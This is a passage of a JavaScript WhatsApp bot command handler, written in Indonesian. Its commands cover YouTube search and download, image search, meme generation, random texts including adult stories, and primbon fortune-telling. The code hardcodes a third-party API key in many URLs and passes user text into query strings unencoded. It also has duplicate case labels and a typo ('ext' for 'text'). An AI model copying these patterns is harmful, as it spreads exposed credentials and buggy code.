	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    satria.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : fdoc })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                satria.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: fdoc })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `⭔ *Title* : ${g.title}\n`
                teks += `⭔ *Description* : ${g.snippet}\n`
                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
        })
        }
        break
	    case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                satria.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                satria.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: fdoc })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                satria.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: fdoc })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda m.reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                satria.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                satria.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: fdoc })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda m.reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                satria.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: fdoc })
            }
            break
            case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                satria.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: fdoc })
            }
            break
            case 'anime': case 'husbu': case 'shinobu': case 'megumin': case 'waifu': case 'neko': case 'trap': case 'blowjob': {
                m.reply(mess.wait)
                let buttons = [
                    {buttonId: `.${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://zenzapis.xyz/randomanime/${command}?apikey=satganzdevs` },
                    caption: `Generate Random ${command}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'neko': {
                m.reply(mess.wait)
                let buttons = [
                    {buttonId: `.${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://zenzapis.xyz/api/anime/sfw/${command}?apikey=satganzdevs` },
                    caption: `Generate Random ${command}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'fox': {
                m.reply(mess.wait)
                let buttons = [
                    {buttonId: `.${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://zenzapis.xyz/api/anime/sfw/fox_girl?apikey=satganzdevs` },
                    caption: `Generate Random ${command}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'wallpaperanime': case 'wppanime':{
                m.reply(mess.wait)
                let buttons = [
                    {buttonId: `.${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://zenzapis.xyz/api/anime/sfw/wallpaper?apikey=satganzdevs` },
                    caption: `Generate Random ${command}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'is': case 'imgsearch':{
            	if (!text) throw `Input The Query`
         let anu = `https://zenzapis.xyz/searching/gimage2?query=${q}&apikey=satganzdevs`
            m.reply(mess.wait)
                let buttons = [
                    {buttonId: `${command} ${q}`, buttonText: {displayText: `Next ${q}`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu },
                    caption: `What we got about ${q}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
	    case 'couple': case 'cp': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://zenzapis.xyz/randomanime/couples?apikey=satganzdevs')
                let random = anu[Math.floor(Math.random() * anu.length)]
                satria.sendMessage(m.chat, { image: { url: anu.result.male }, caption: `Couple Male` }, { quoted: fdoc })
                satria.sendMessage(m.chat, { image: { url: anu.result.female }, caption: `Couple Female` }, { quoted: fdoc })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'tweetmaker':{
            	if(!text) throw `Example : ${command} username|text`
            m.reply(mess.wait)
let tes1 = text.split("|")[0]
let tes2 = text.split("|")[1] 
let anjay = `https://zenzapis.xyz/creator/maketweet?text2=${tes1}&text=${tes2}&apikey=satganzdevs`
            satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fdoc })
            }
            break
            case 'kannagen':{
            	if(!text) throw `Example : ${command} text`
let tes1 = args.join(" ")
let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzdevs`
                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fdoc })
            }
            break
            case 'pooh':{
            	if(!text) throw `Example : ${command} text1|text2`
            m.reply(mess.wait)
let tes1 = text.split("|")[0]
let tes2 = text.split("|")[1]
let anjay = `https://zenzapis.xyz/creator/poohmeme?text=${tes1}&text2=${tes2}&apikey=satganzdevs`
                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fdoc })
            }
            break
            case 'drake':{
            	if(!text) throw `Example : ${command} text1|text2`
            m.reply(mess.wait)
let tes1 = text.split("|")[0]
let tes2 = text.split("|")[1]
let anjay = `https://zenzapis.xyz/creator/drakememe?text=${tes1}&text2=${tes2}&apikey=satganzdevs`
                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fdoc })
            }
            break
            case 'tahta':{
            	if(!text) throw `Example : ${command} text`
            m.reply(mess.wait)
let tes1 = args.join(" ")
let anjay = `https://zenzapis.xyz/creator/hartatahta?text=${tes1}&apikey=satganzdevs`
                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fdoc })
            }
            break
            case 'sadcat':{
            	if(!text) throw `Example : ${command} text`
            m.reply(mess.wait)
let tes1 = args.join(" ")
let anjay = `https://zenzapis.xyz/creator/sadcat?text=${tes1}&apikey=satganzdevs`
                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fdoc })
            }
            break
            case 'changemymind': case 'cmm':{
            	if(!text) throw `Example : ${command} text`
            m.reply(mess.wait)
let tes1 = args.join(" ")
let anjay = `https://zenzapis.xyz/creator/changemymind?text=${tes1}&apikey=satganzdevs`
                satria.sendMessage(m.chat, { image: { url: anjay }, caption: `${command}` }, { quoted: fdoc })
            }
            break
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': case 'pantun': {
                let anu = await fetchJson(`https://zenzapis.xyz/randomtext/${command}?apikey=satganzdevs`)
                let buttons = [
                    {buttonId: `${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'creepyfact':{
              let anu = await fetchJson('https://zenzapis.xyz/randomtext/creepyfact?apikey=satganzdevs')
                let buttons = [
                    {buttonId: `${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'faktaunik':{
            	let anu = await fetchJson('https://zenzapis.xyz/randomtext/faktaunik?apikey=satganzdevs')
                let buttons = [
                    {buttonId: `${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'cersex':{
            let anu = await fetchJson('https://zenzapis.xyz/randomtext/cersex?apikey=satganzdevs')
                let buttons = [
                    {buttonId: `${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'cerpen':{
            let anu = await fetchJson('https://zenzapis.xyz/randomtext/cerpen?apikey=satganzdevs')
                let buttons = [
                    {buttonId: `${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case 'kanyequote':{
            let anu = await fetchJson('https://zenzapis.xyz/randomtext/kanyequote?apikey=satganzdevs')
                let buttons = [
                    {buttonId: `${command}`, buttonText: {displayText: `Next ${command}`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                satria.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                satria.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: fdoc })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                satria.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: fdoc })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                satria.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
